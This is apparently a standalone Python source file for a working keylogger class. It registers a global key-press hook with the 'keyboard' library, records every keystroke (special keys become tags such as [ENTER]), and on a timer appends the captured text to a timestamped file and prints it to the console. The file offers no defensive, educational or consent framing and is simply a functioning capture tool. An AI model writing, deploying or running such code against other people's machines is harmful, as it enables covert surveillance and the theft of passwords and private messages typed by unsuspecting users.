import keyboard
from threading import Timer
from datetime import datetime


class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.filename = ""

    def callback(self, event):
        name = event.name

        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def create_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "a") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def report(self):
        if self.log:

            self.report_to_file()

            print(f"[{self.filename}] - {self.log}")

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_press(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()
